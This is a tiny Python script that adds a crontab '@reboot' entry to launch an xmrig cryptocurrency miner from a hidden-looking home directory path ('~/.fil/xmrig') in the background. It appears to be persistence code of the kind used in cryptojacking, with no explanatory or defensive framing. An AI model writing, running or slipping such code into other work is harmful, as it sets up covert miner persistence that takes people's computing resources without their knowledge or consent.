import os

command_to_run = "~/\.fil/xmrig"

cron_job = f"@reboot {command_to_run} &\n"

os.system(f'(crontab -l; echo "{cron_job}") | crontab -')